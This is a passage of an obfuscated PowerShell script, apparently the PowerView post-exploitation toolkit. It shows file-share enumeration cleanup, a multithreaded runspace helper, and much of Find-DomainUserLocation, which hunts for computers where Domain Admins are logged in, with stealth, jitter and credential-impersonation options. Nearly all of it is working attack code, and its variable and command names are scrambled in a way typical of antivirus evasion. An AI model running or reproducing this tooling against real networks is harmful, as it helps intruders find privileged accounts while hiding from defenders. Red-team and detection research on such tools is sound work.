                ${conti`N`UE} = ${TR`Ue}
                if (${pSB`ounD`p`ARa`ME`TERS}['ExcludeFolders'] -and (${_}.PSIsContainer)) {
                    &("{0}{1}{2}" -f'Wr','ite-Verbo','se') "Excluding: $($_.FullName)"
                    ${cO`N`TInUE} = ${f`AlSE}
                }
                if (${LasTacc`esst`i`Me} -and (${_}.LastAccessTime -lt ${laSTaC`CE`ssT`IME})) {
                    ${COnt`I`NuE} = ${FA`lse}
                }
                if (${pS`Bou`Ndpa`RAMe`T`ers}['LastWriteTime'] -and (${_}.LastWriteTime -lt ${l`Ast`Writ`etimE})) {
                    ${c`o`NTINUe} = ${f`ALSE}
                }
                if (${pSbOU`NDpara`m`ete`Rs}['CreationTime'] -and (${_}.CreationTime -lt ${crEATiO`N`TImE})) {
                    ${coNT`I`NuE} = ${fAl`Se}
                }
                if (${PSBou`NDPara`me`TErS}['CheckWriteAccess'] -and (-not (&("{2}{0}{1}"-f'est-Wr','ite','T') -Path ${_}.FullName))) {
                    ${co`N`TinUE} = ${f`ALsE}
                }
                if (${CONtI`N`Ue}) {
                    ${Fi`LePa`RaMs} = @{
                        'Path' = ${_}.FullName
                        'Owner' = $((&("{0}{1}" -f 'Get-Ac','l') ${_}.FullName).Owner)
                        'LastAccessTime' = ${_}.LastAccessTime
                        'LastWriteTime' = ${_}.LastWriteTime
                        'CreationTime' = ${_}.CreationTime
                        'Length' = ${_}.Length
                    }
                    ${fO`UnD`File} = &("{2}{0}{1}" -f'Ob','ject','New-') -TypeName ("{0}{2}{1}" -f'P','ect','SObj') -Property ${Fi`lE`P`ARAMS}
                    ${F`OU`NdfILE}.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    ${FO`UNDF`ile}
                }
            }
        }
    }

    END {
        # remove the IPC$ mappings
        ${maPPEdc`O`M`pUtE`Rs}.Keys | &("{5}{6}{1}{3}{0}{4}{2}" -f'ct','C','n','onne','io','Remove-Re','mote')
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function n`Ew-TH`RE`Ad`edFU`N`CtIOn {
    # Helper used by any threaded host enumeration functions
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue}, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [String[]]
        ${compu`Te`R`N`AME},

        [Parameter(Position = 1, Mandatory = ${Tr`UE})]
        [System.Management.Automation.ScriptBlock]
        ${sCri`PTBl`ocK},

        [Parameter(Position = 2)]
        [Hashtable]
        ${SCRiPt`paR`AMet`ErS},

        [Int]
        [ValidateRange(1,  100)]
        ${t`hRea`dS} = 20,

        [Switch]
        ${N`oi`MPoRts}
    )

    BEGIN {
        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        ${SEss`IoNsTa`TE} = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        # force a single-threaded apartment state (for token-impersonation stuffz)
        ${se`SSIons`Ta`TE}.ApartmentState = [System.Threading.ApartmentState]::STA

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if (-not ${No`imPor`TS}) {
            # grab all the current variables for this runspace
            ${m`yvA`Rs} = &("{1}{2}{0}" -f 'riable','Get','-Va') -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            ${V`o`R`Bi`dDeNVaRs} = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach (${V`Ar} in ${MYv`ArS}) {
                if (${vOrbidDEN`VA`Rs} -NotContains ${V`Ar}.Name) {
                ${SES`sIONstA`TE}.Variables.Add((&("{2}{1}{0}"-f 'ct','-Obje','New') -TypeName ("{7}{3}{0}{16}{14}{8}{13}{4}{2}{11}{12}{9}{10}{5}{15}{1}{6}" -f 'em','eEn','ssionSt','Manag','spaces.Se','i','try','System.','on.R','Va','r','at','e','un','tomati','abl','ent.Au') -ArgumentList ${V`Ar}.name,${V`AR}.Value,${v`AR}.description,${v`AR}.options,${v`Ar}.attributes))
                }
            }

            # add Functions from current runspace to the InitialSessionState
            ForEach (${fun`Ct`i`on} in (&("{1}{0}{2}"-f 'ildI','Get-Ch','tem') ("{1}{2}{0}"-f'on:','Fun','cti'))) {
                ${sEs`SIonsta`TE}.Commands.Add((&("{0}{2}{1}" -f 'New-O','ect','bj') -TypeName ("{10}{2}{15}{5}{8}{13}{7}{9}{18}{4}{1}{16}{19}{14}{12}{6}{3}{17}{0}{11}" -f'unctionE','.','t','n','tion','Managem','essio','.A','en','ut','Sys','ntry','aces.S','t','nsp','em.','R','StateF','oma','u') -ArgumentList ${FU`Nc`Tion}.Name, ${FUNCT`i`On}.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        ${P`OOl} = [RunspaceFactory]::CreateRunspacePool(1, ${t`h`ReaDS}, ${S`esSi`oNS`TAtE}, ${h`OsT})
        ${PO`ol}.Open()

        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
        ${Me`THod} = ${nU`ll}
        ForEach (${M} in [PowerShell].GetMethods() | &("{3}{1}{2}{0}" -f 'ject','her','e-Ob','W') { ${_}.Name -eq 'BeginInvoke' }) {
            ${MET`ho`Dp`ARAmeteRS} = ${m}.GetParameters()
            if ((${me`THoDPa`RAM`etERS}.Count -eq 2) -and ${m`eThodPAr`AmE`TeRS}[0].Name -eq 'input' -and ${ME`T`hoDPaRA`MET`ErS}[1].Name -eq 'output') {
                ${mEt`hoD} = ${M}.MakeGenericMethod([Object], [Object])
                break
            }
        }

        ${J`OBs} = @()
        ${CO`mput`ern`Ame} = ${c`O`MPUTERna`me} | &("{3}{1}{2}{0}" -f'ct','e-Obj','e','Wher') {${_} -and ${_}.Trim()}
        &("{2}{0}{1}"-f'e','rbose','Write-V') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # partition all hosts from -ComputerName into $Threads number of groups
        if (${THr`EAdS} -ge ${c`OMp`U`TernAmE}.Length) {
            ${thre`Ads} = ${cOm`put`ErnA`ME}.Length
        }
        ${eLE`MENt`S`Pli`Tsi`ze} = [Int](${c`OmpUte`R`NAme}.Length/${tHReA`ds})
        ${CO`mPUteRNa`mE`pa`RTITI`oNEd} = @()
        ${St`ArT} = 0
        ${E`Nd} = ${ELemEN`T`sp`li`TsIze}

        for(${i} = 1; ${I} -le ${t`HreA`ds}; ${I}++) {
            ${L`ist} = &("{1}{0}{2}"-f 'jec','New-Ob','t') ("{0}{2}{8}{6}{1}{4}{7}{5}{3}" -f'Sys','s.','tem.Coll','st','A','i','tion','rrayL','ec')
            if (${I} -eq ${tHr`eadS}) {
                ${E`Nd} = ${CO`MPUT`ErnA`ME}.Length
            }
            ${L`ist}.AddRange(${c`ompuT`ErNa`ME}[${ST`A`Rt}..(${E`Nd}-1)])
            ${S`TA`RT} += ${ELem`EN`Ts`pLiTS`i`Ze}
            ${e`ND} += ${el`eME`N`TSPlI`T`siZe}
            ${Co`mP`UtE`R`N`AmepaRTi`Ti`OneD} += @(,@(${Li`sT}.ToArray()))
        }

        &("{2}{0}{3}{1}" -f 'ri','e','W','te-Verbos') "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach (${C`OMpUTE`RnamepA`RtItION} in ${cOMPuTe`RnaME`p`A`RTI`TI`o`Ned}) {
            # create a "powershell pipeline runner"
            ${poWE`RShe`lL} = [PowerShell]::Create()
            ${Po`W`erSHell}.runspacepool = ${PO`oL}

            # add the script block + arguments with the given computer partition
            ${NU`LL} = ${POw`E`RSheLL}.AddScript(${sCR`IpT`Bl`OCK}).AddParameter('ComputerName', ${CompU`Ter`Namep`AR`TITI`on})
            if (${scripTP`ARAMeT`e`Rs}) {
                ForEach (${PAR`AM} in ${sCRIPT`P`Ar`AmETers}.GetEnumerator()) {
                    ${N`UlL} = ${po`W`eRSHe`ll}.AddParameter(${pA`RaM}.Name, ${Pa`RAm}.Value)
                }
            }

            # create the output queue
            ${OUtP`Ut} = &("{0}{1}{2}"-f 'New-','Obje','ct') ("{3}{5}{6}{4}{7}{1}{10}{9}{12}{11}{2}{0}{13}{8}"-f 'c','ation','n[Obje','Manageme','Aut','n','t.','om',']','at','.PSD','llectio','aCo','t')

            # kick off execution using the BeginInvok() method that allows queues
            ${J`obS} += @{
                PS = ${pO`w`ER`SHell}
                Output = ${Ou`TpuT}
                Result = ${MeT`h`od}.Invoke(${PO`wer`shell}, @(${n`UlL}, [Management.Automation.PSDataCollection[Object]]${o`UTpUT}))
            }
        }
    }

    END {
        &("{1}{4}{3}{2}{0}" -f 'rbose','Wr','e-Ve','t','i') "[New-ThreadedFunction] Threads executing"

        # continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach (${j`Ob} in ${JO`Bs}) {
                ${J`OB}.Output.ReadAll()
            }
            &("{0}{1}{2}"-f 'Start','-','Sleep') -Seconds 1
        }
        While ((${Jo`Bs} | &("{0}{3}{2}{1}"-f'Where','t','jec','-Ob') { -not ${_}.Result.IsCompleted }).Count -gt 0)

        ${sLE`E`PSecO`N`ds} = 100
        &("{1}{3}{2}{0}" -f'Verbose','W','-','rite') "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        # cleanup- make sure we didn't miss anything
        for (${I}=0; ${I} -lt ${sleeP`SEC`on`dS}; ${I}++) {
            ForEach (${j`ob} in ${Jo`BS}) {
                ${J`ob}.Output.ReadAll()
                ${j`OB}.PS.Dispose()
            }
            &("{2}{1}{0}"-f'ep','-Sle','Start') -S 1
        }

        ${p`OOL}.Dispose()
        &("{1}{2}{3}{0}"-f 'ose','W','rit','e-Verb') "[New-ThreadedFunction] all threads completed"
    }
}


function Fi`ND-d`OmaiN`UsE`Rl`oC`ATI`oN {
<#
.SYNOPSIS

Finds domain machines where specific users are logged into.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
The found user list is compared against the target list, and any matches are
displayed. If -ShowAll is specified, all results are displayed instead of
the filtered set. If -Stealth is specified, then likely highly-trafficed servers
are enumerated with Get-DomainFileServer/Get-DomainController, and session
enumeration is executed only against those servers. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER UserAllowDelegation

Switch. Search for user accounts that are not marked as 'sensitive and not allowed for delegation'.

.PARAMETER CheckAccess

Switch. Check if the current user has local admin access to computers where target users are found.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER ShowAll

Switch. Return all user location results instead of filtering based on target
specifications.

.PARAMETER Stealth

Switch. Only enumerate sessions from connonly used target servers.

.PARAMETER StealthSource

The source of target servers to use, 'DFS' (distributed file servers),
'DC' (domain controllers), 'File' (file servers), or 'All' (the default).

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserLocation

Searches for 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainUserLocation -Stealth -ShowAll

Enumerates likely highly-trafficked servers, performs just session enumeration
against each, and outputs all results.

.EXAMPLE

Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
users in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainUserLocation -Domain testlab.local -Credential $Cred

Searches for domain admin locations in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserLocation
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('DNSHostName')]
        [String[]]
        ${coM`PuTErNa`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`MaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMPUte`Rd`o`mAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`mpuTEr`Ldapfi`lTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Com`Puter`s`EarcH`B`ASE},

        [Alias('Unconstrained')]
        [Switch]
        ${Co`MPuTE`R`UNco`N`sTraInED},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${c`O`MP`UtEROpeRaTI`Ng`SyST`eM},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${Co`MPu`TeRS`e`R`VIc`Epack},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${CompU`T`E`R`sitenA`ME},

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Use`RI`dE`NtiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${useRDo`MA`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`seR`LDa`p`FiltEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${usERsEaRch`Ba`Se},

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${us`E`RG`ROuPId`eNtiTy} = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        ${UsE`RadMi`NC`oU`Nt},

        [Alias('AllowDelegation')]
        [Switch]
        ${usErA`lLo`W`dE`lEg`A`TioN},

        [Switch]
        ${ch`E`CkA`CcesS},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`eRv`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sE`ARc`HS`copE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSultP`Age`SI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVer`T`Im`eLi`mIt},

        [Switch]
        ${t`O`mBSToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`E`dentIal} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${st`OPonSU`C`CESs},

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`l`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JiT`T`er} = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        ${sHO`wA`LL},

        [Switch]
        ${S`Te`AlTh},

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        ${S`TeAl`Thsou`R`ce} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${THRe`ADS} = 20
    )

    BEGIN {

        ${C`omPute`RSeaRc`hERA`Rg`U`me`NTs} = @{
            'Properties' = 'dnshostname'
        }
        if (${P`sBouN`dpaR`AMEtERS}['Domain']) { ${cOmp`Ute`RsEaRcH`e`RaRgumE`N`TS}['Domain'] = ${dOMa`IN} }
        if (${pSboun`dPara`M`eTERs}['ComputerDomain']) { ${comPutERSEAR`cheRA`R`G`UmENTs}['Domain'] = ${Com`pu`TErdoMAIn} }
        if (${psb`OUndP`A`RAm`eteRS}['ComputerLDAPFilter']) { ${CoMPuteRseaRCh`e`RaRg`U`Men`TS}['LDAPFilter'] = ${co`m`PUTerldapfIl`TER} }
        if (${p`SbouNdp`ARaM`E`TERS}['ComputerSearchBase']) { ${c`oM`pu`TeRSe`Ar`Ch`eRAr`gUMen`TS}['SearchBase'] = ${co`mp`U`TE`RseARchB`ASe} }
        if (${pSb`OU`NdParAmeT`e`RS}['Unconstrained']) { ${cO`mpUT`ERs`EArCheRa`RGumeNTs}['Unconstrained'] = ${U`NCOn`S`TrAINed} }
        if (${p`sBouN`DpA`R`Ameters}['ComputerOperatingSystem']) { ${coMpUT`ERs`E`ArcHeRA`RGU`mEN`TS}['OperatingSystem'] = ${OPeRAT`I`NGSY`st`EM} }
        if (${p`sBo`UNDPa`Ram`eTErS}['ComputerServicePack']) { ${COmpUT`E`RseArCHER`ArGu`MEnTs}['ServicePack'] = ${s`e`RViCEP`ACK} }
        if (${PsbOUndP`Ara`mE`TeRs}['ComputerSiteName']) { ${cOM`PUtE`Rsea`R`CheRaRGU`MeNts}['SiteName'] = ${s`ITE`NAme} }
        if (${psbo`UndPaRa`M`eTERs}['Server']) { ${COm`p`UTerSE`ARch`E`RA`RgumenTs}['Server'] = ${SeRv`Er} }
        if (${P`SbouN`DpARaM`eTeRS}['SearchScope']) { ${COmp`UterSEaR`C`HE`RA`RGuMeNTs}['SearchScope'] = ${s`EaRc`HsC`oPE} }
        if (${PS`BO`U`N`dPA`RamETErS}['ResultPageSize']) { ${coMPUT`Er`sEARCh`e`R`AR`gUM`ENTS}['ResultPageSize'] = ${r`esUl`TPaGES`I`Ze} }
        if (${Ps`B`ounDpa`RAmET`ERS}['ServerTimeLimit']) { ${ComPUtErsE`ArCh`Er`ARG`UME`NTs}['ServerTimeLimit'] = ${seR`VeRTI`m`eLIMIt} }
        if (${Ps`B`Ou`N`DParaMETe`Rs}['Tombstone']) { ${cOMPUt`Er`se`ArCHE`R`ArgUMEnTS}['Tombstone'] = ${tOmBS`T`One} }
        if (${P`sboUnD`P`ARAMET`eRs}['Credential']) { ${CompUTErSeaR`chEr`A`Rgu`mEnTs}['Credential'] = ${c`Re`DEnTI`AL} }

        ${U`ser`SEAr`ch`e`RarGumentS} = @{
            'Properties' = 'samaccountname'
        }
        if (${Ps`BOu`Ndp`AraMeTerS}['UserIdentity']) { ${uSERsEaRCh`erArGUm`e`NTs}['Identity'] = ${usER`iD`en`TITy} }
        if (${P`Sbo`Und`p`ARA`MetERS}['Domain']) { ${Use`RS`EA`RC`herargu`MEn`Ts}['Domain'] = ${dOm`AiN} }
        if (${psbo`U`NDPa`RA`MEtERs}['UserDomain']) { ${uSEr`SEa`Rc`h`er`ARgUM`ents}['Domain'] = ${use`Rd`omAIN} }
        if (${PSBO`U`NDpA`Ra`MEtERs}['UserLDAPFilter']) { ${Use`RSea`R`CHeRArGuMen`TS}['LDAPFilter'] = ${Use`RLDapFi`lT`er} }
        if (${pSboU`NDPaR`AMe`TERS}['UserSearchBase']) { ${USe`RseArcH`ERA`Rg`Uments}['SearchBase'] = ${user`SEA`Rchb`A`Se} }
        if (${pSBo`U`Nd`paRam`EtERS}['UserAdminCount']) { ${usERs`ea`RC`herarGuM`e`N`Ts}['AdminCount'] = ${usErAdM`inCo`U`Nt} }
        if (${PSBo`UnDp`ARAmetE`Rs}['UserAllowDelegation']) { ${us`erSE`A`Rch`ERaRguments}['AllowDelegation'] = ${useRALLO`w`de`leGatION} }
        if (${psb`O`UN`dpARAm`Et`eRS}['Server']) { ${U`sERSe`AR`cH`erARGUMents}['Server'] = ${sE`R`VER} }
        if (${PsBOuNdpAR`AmE`Te`RS}['SearchScope']) { ${U`sE`R`s`EA`RcHErARgumEn`Ts}['SearchScope'] = ${se`Ar`cHScO`Pe} }
        if (${pS`BOu`NdPArAm`ETerS}['ResultPageSize']) { ${UsEr`Sea`RcH`EraRGUmeN`Ts}['ResultPageSize'] = ${R`Esu`Lt`PaGesIze} }
        if (${PSBoUn`dParam`Et`E`Rs}['ServerTimeLimit']) { ${U`SeRS`eARCHER`AR`gU`mEnTS}['ServerTimeLimit'] = ${s`ErVeRti`mE`lIM`IT} }
        if (${psb`OunD`p`AramEtE`Rs}['Tombstone']) { ${Us`E`Rs`EarchErAr`gUMENts}['Tombstone'] = ${T`omBs`TOne} }
        if (${Ps`Bo`U`ND`PARAMeterS}['Credential']) { ${us`e`RSearCH`Era`RGumE`N`Ts}['Credential'] = ${c`RedEN`T`IaL} }

        ${T`ARGeTco`M`PUte`Rs} = @()

        # first, build the set of computers to enumerate
        if (${pS`BOUndpAr`Ame`T`Ers}['ComputerName']) {
            ${TARG`eTCOm`pU`T`eRS} = @(${ComPU`TEr`NAme})
        }
        else {
            if (${pSBounD`P`A`R`A`MeTErs}['Stealth']) {
                &("{2}{4}{0}{3}{1}" -f'te-Ve','bose','W','r','ri') "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
                ${TA`RgETC`o`MpUt`E`RAr`RayLisT} = &("{2}{1}{0}"-f't','w-Objec','Ne') ("{0}{2}{3}{1}{5}{4}"-f 'S','lectio','yste','m.Col','.ArrayList','ns')

                if (${s`TEA`ltH`s`OurcE} -match 'File|All') {
                    &("{2}{1}{0}" -f 'te-Verbose','ri','W') '[Find-DomainUserLocation] Querying for file servers'
                    ${fIle`S`ERvER`sEA`R`cheRa`RGUM`enTs} = @{}
                    if (${P`SB`O`UN`DpA`RamEtERS}['Domain']) { ${fi`LeSeR`VERSEAr`cHerArGU`MenTS}['Domain'] = ${dO`MaiN} }
                    if (${P`S`BOu`ND`pArAmeTErs}['ComputerDomain']) { ${fIL`e`Se`Rve`RseArch`er`ARg`UMe`NTS}['Domain'] = ${C`omPu`Terdoma`IN} }
                    if (${psBOund`PAR`AM`E`T`erS}['ComputerSearchBase']) { ${fiLes`E`R`V`ErseA`RCHEra`Rgume`NTs}['SearchBase'] = ${cO`mPut`er`S`ea`RCHBASe} }
                    if (${psb`oU`N`DpARAmEtE`RS}['Server']) { ${fI`leSErve`R`s`eaR`CheRA`RGU`mEn`Ts}['Server'] = ${s`ERVEr} }
                    if (${psbo`UndPAR`AMETe`RS}['SearchScope']) { ${filE`sER`VE`RSEA`R`ChERAr`gumE`NTs}['SearchScope'] = ${se`Ar`ch`sCoPe} }
                    if (${p`sBoUn`d`pAr`AmeTers}['ResultPageSize']) { ${File`Se`Rv`eRS`EA`RCHERArgumeNts}['ResultPageSize'] = ${REs`Ul`TPa`gEsiZE} }
                    if (${PS`BOUnD`paraMEt`eRS}['ServerTimeLimit']) { ${Fi`l`ESerVeRsEarc`H`erARgU`M`eNTs}['ServerTimeLimit'] = ${sERve`R`TimELI`miT} }
                    if (${P`sbOunDp`AraMe`T`eRS}['Tombstone']) { ${FilesEr`V`Er`SEar`cHeraRGuM`ENTs}['Tombstone'] = ${tomb`S`TO`NE} }
                    if (${p`SBOUNDp`A`Ra`mETERs}['Credential']) { ${F`IlesE`RvER`SeAR`CherARguME`NTS}['Credential'] = ${c`RE`dEN`Tial} }
                    ${fIle`sE`RveRS} = &("{0}{2}{3}{4}{1}" -f'G','leServer','e','t-Domai','nFi') @FileServerSearcherArguments
                    if (${fi`les`ER`VErS} -isnot [System.Array]) { ${fiLeSE`RV`eRs} = @(${F`i`lE`seRveRS}) }
                    ${taRGEtc`oMput`era`RrAYLi`st}.AddRange( ${FI`l`ES`eRVerS} )
                }
                if (${S`T`EaLTh`SOuRce} -match 'DFS|All') {
                    &("{2}{0}{1}"-f'it','e-Verbose','Wr') '[Find-DomainUserLocation] Querying for DFS servers'
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}
                }
                if (${StE`ALtH`S`o`UrCE} -match 'DC|All') {
                    &("{0}{1}{2}" -f'Wri','t','e-Verbose') '[Find-DomainUserLocation] Querying for domain controllers'
                    ${d`C`SeARcHEraRGUMen`TS} = @{
                        'LDAP' = ${t`Rue}
                    }
                    if (${p`sbO`UndpARAMETe`RS}['Domain']) { ${D`cs`eArCHeR`ARG`Um`e`Nts}['Domain'] = ${dom`AiN} }
                    if (${pSb`OU`NdpAR`AME`TERs}['ComputerDomain']) { ${D`CSEAR`chERargu`MEN`TS}['Domain'] = ${C`O`m`PUteRdoMA`IN} }
                    if (${Psb`OUND`pARaMet`e`RS}['Server']) { ${d`CSear`CH`eR`ARGu`MEnts}['Server'] = ${S`ErveR} }
                    if (${PsboU`Nd`PA`R`AMe`TERs}['Credential']) { ${dC`Se`ARc`HERaRg`UMENts}['Credential'] = ${CRedENT`i`Al} }
                    ${DoMAI`NCONt`RO`Llers} = &("{3}{2}{1}{0}" -f 'er','ntroll','DomainCo','Get-') @DCSearcherArguments | &("{1}{0}{2}"-f 'elect-Objec','S','t') -ExpandProperty ("{2}{3}{1}{0}"-f 'ame','stn','dnsh','o')
                    if (${d`omAinC`ONt`ROLLers} -isnot [System.Array]) { ${dOMAi`NconT`RolLe`Rs} = @(${do`ma`i`NConT`R`oLLeRs}) }
                    ${t`ARg`eTCompu`Terar`RaYLIst}.AddRange( ${DO`mAIN`CoN`Tr`olLErS} )
                }
                ${TArgE`TcoM`P`UTers} = ${TargetC`Om`pu`TERar`RaYli`st}.ToArray()
            }
            else {
                &("{3}{2}{1}{0}" -f'ose','Verb','-','Write') '[Find-DomainUserLocation] Querying for all computers in the domain'
                ${tAR`GetCo`MpUT`eRS} = &("{3}{0}{1}{2}"-f'i','nCompu','ter','Get-Doma') @ComputerSearcherArguments | &("{2}{0}{1}{3}"-f't','-Obje','Selec','ct') -ExpandProperty ("{0}{2}{1}{3}"-f'd','m','nshostna','e')
            }
        }
        &("{2}{1}{0}{3}"-f 'bos','er','Write-V','e') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if (${t`Arg`eTco`mPUtE`Rs}.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # get the current user so we can ignore it in the results
        if (${psbOuNDp`A`R`AMeTE`RS}['Credential']) {
            ${curr`enT`User} = ${C`Re`DEN`TiaL}.GetNetworkCredential().UserName
        }
        else {
            ${curRe`N`TuSER} = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if (${pSB`O`U`NdparA`M`ETErs}['ShowAll']) {
            ${T`AR`getuse`Rs} = @()
        }
        elseif (${ps`BOu`NdPARaM`e`T`eRs}['UserIdentity'] -or ${Ps`Boun`dpAR`A`MeTeRs}['UserLDAPFilter'] -or ${pSB`oU`N`dPAR`AmETE`RS}['UserSearchBase'] -or ${Psb`o`UnDParaM`ETE`Rs}['UserAdminCount'] -or ${P`sBOuN`D`P`AraMeTE`Rs}['UserAllowDelegation']) {
            ${Tar`G`ETuS`eRs} = &("{0}{2}{1}{3}" -f'G','Doma','et-','inUser') @UserSearcherArguments | &("{2}{1}{0}" -f 't','jec','Select-Ob') -ExpandProperty ("{1}{3}{4}{2}{0}"-f'me','s','a','amaccoun','tn')
        }
        else {
